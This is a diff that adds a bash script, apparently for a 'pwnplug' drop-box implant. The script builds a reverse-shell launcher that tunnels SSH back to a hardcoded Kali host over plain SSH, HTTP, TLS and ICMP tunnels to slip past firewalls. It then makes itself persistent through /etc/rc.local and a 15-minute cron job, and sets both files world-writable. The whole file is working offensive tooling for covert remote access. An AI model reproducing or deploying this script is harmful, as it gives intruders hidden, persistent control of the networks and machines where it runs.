@@ -1,0 +1,22 @@
+#! /bin/bash
+mkdir -p /var/connect/reverseshell/
+#54.88.76.202 -kali
+#54.209.189.22 tunnels
+#testing w/ kali first
+hostip=54.88.76.202
+reverse_shell=/var/connect/reverseshell/reverseshell.sh
+mv "$reverse_shell" /var/pwnplug/reverseshell/reverseshell.bak 
+echo "killall ptunnel; killall stunnel4; killall ssh">> "$reverse_shell"
+echo "ssh -NR 3333:localhost:22 -i /root/.ssh/id_rsa pwnplug@"$hostip" -p 22 &" >> "$reverse_shell"
+echo "htc -F 8081 "$hostip":80 &" >> "$reverse_shell"
+echo "ssh -NR 3338:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 8081 &">> "$reverse_shell"
+echo "stunnel -c -d 4321 -r "$hostip":443 &">>"$reverse_shell" 
+echo "sleep 10";  echo "ssh -NR 3336:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 4321 &">>"$reverse_shell"
+echo "ptunnel -lp 7654 -p "$hostip" -da "$hostip" -dp 22 -c eth0 &">>"$reverse_shell" 
+echo "ssh -NR 3339:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 7654 &">>"$reverse_shell"
+chmod 777 "$reverse_shell"
+mv /etc/rc.local /etc/rc.local.orig 
+sed '$ i\/var/connect/reverseshell/reverseshell.sh' /etc/rc.local.orig >/etc/rc.local
+chmod 777 /etc/rc.local
+crontab -l
+echo "*/15 * * * * /var/pwnplug/reverseshell/reverseshell.sh" |crontab - 
